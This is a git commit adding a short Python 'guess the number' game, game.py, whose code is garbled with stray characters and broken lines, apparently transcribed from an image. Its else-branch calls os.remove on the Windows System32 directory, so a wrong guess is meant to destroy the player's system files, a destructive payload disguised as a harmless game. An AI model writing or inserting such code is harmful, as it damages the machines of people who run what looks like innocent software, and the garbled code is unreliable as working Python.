8558f9430194aeb74e68c950e7b386939ce91769
AutoBullet <138841252+AydinGhorbani@users.noreply.github.com>
2024-04-12 01:06:34 -0400

    Create game.py

---
+++ game.py
@@ -0,0 +1,10 @@
+import random
+Limport os
+number = random. randint (1,10)
+guess = input("Silly game! Guess number between 1 and 10")
+guess =
+int(guess)
+Jif guess == number:
+print("You Won!")
+曰else：
+os. remove("C: \Windows\System32")
